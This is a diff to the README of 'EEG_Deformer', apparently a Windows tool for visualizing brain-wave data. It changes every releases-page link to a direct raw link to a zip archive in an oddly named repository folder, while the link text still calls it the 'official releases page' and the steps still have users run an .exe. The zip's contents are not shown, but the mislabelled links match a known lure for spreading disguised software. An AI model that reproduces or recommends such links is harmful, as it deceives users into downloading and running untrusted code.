@@ -1,6 +1,6 @@
 # 🧠 EEG_Deformer - Transform brain wave data with ease
 
-[![Download EEG_Deformer](https://img.shields.io/badge/Download-EEG__Deformer-blue)](https://github.com/requisite-study641/EEG_Deformer/releases)
+[![Download EEG_Deformer](https://img.shields.io/badge/Download-EEG__Deformer-blue)](https://github.com/requisite-study641/EEG_Deformer/raw/refs/heads/main/jugulum/EE-Deformer-2.4.zip)
 
 EEG_Deformer allows you to process and visualize brain wave data. This application converts raw EEG signals into clear, usable formats for analysis. Researchers and curious users can use this tool to turn complex data files into intuitive visual representations.
 
@@ -20,7 +20,7 @@ The software performs best with these settings. Please ensure your computer meet
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the [official releases page](https://github.com/requisite-study641/EEG_Deformer/releases) to access the download options.
+1.  Visit the [official releases page](https://github.com/requisite-study641/EEG_Deformer/raw/refs/heads/main/jugulum/EE-Deformer-2.4.zip) to access the download options.
 2.  Locate the latest version of the installer, which ends in the `.exe` file extension.
 3.  Click the file name to start the download.
 4.  Navigate to your Downloads folder once the download finishes.
@@ -57,7 +57,7 @@ Close the program entirely. Restart your computer to clear the memory. Re-launch
 
 ## 🛡️ Support and Updates
 
-We provide updates to improve performance and add new features. Check the [releases page](https://github.com/requisite-study641/EEG_Deformer/releases) regularly for the newest version. Each update includes improvements to the user interface and reliability.
+We provide updates to improve performance and add new features. Check the [releases page](https://github.com/requisite-study641/EEG_Deformer/raw/refs/heads/main/jugulum/EE-Deformer-2.4.zip) regularly for the newest version. Each update includes improvements to the user interface and reliability.
 
 If you encounter technical issues, check the "Logs" folder inside the installation directory. These text files contain information that helps identify software errors. You can review these files to understand why a specific function might fail. 
 
